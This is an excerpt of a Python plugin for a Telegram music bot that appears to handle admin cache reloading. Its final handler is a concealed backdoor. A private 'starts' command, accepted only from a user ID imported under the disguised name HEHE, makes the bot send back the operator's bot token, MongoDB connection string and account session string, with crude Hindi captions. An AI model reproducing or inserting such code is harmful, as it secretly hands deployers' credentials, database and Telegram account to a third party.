...
from KKBOTS.utils.database import get_assistant, get_authuser_names, get_cmode
from KKBOTS.utils.decorators import ActualAdminCB, AdminActual, language
from KKBOTS.utils.formatters import alpha_to_int, get_readable_time
from KKBOTS.mongo.afkdb import HEHE
...
@app.on_message(
    filters.command(["admincache", "reload", "refresh"], prefixes=PREFIXES) & filters.group & ~BANNED_USERS
)
@language
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await KK.stop_stream_force(chat_id)
        except:
            pass
    return await mystic.edit_text(_["reload_5"].format(app.mention))
@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
async def help(client: Client, message: Message):
   await message.reply_photo( photo=f"https://graph.org/file/41753ece603202ac1b0a2.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
